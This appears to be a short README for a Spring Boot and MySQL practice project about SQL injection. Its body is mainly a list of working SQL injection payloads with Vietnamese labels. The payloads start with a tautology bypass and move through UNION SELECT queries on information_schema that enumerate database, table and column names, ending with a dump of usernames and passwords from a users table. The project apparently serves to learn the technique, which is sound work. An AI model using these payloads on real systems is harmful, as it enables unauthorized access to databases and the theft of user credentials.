# DatabseInjection
## SPRING BOOT PROJECT
Use MySQL database, the structure of database as the image below(like SecurityandEncryption project absolutely)


----lấy ra tất cả các trường: 
	'' or 1='1'




----------lấy ra tên của database: 
		''union select 3,table_schema,4 from information_schema.tables union select 5,'6',7
			
		

----------lấy ra tên của bảng: 
	     ''union select 3,table_name,4 from information_schema.tables where table_schema='applicationdomain' union select 5,6,'7'
	

-----------lấy ra các trường trong bảng: 
		''union select 3,column_name,4 from information_schema.columns where table_name='users' union select 5,6,'7'
--------------lấy ra đầy đủ tài khoản: 
		''union all select 3,username,password from applicationdomain.users union all select 5,'6','7'
    
![diagram](https://user-images.githubusercontent.com/64321224/127884163-5ba7373c-0a7b-4bad-935a-943df2fcd676.png)
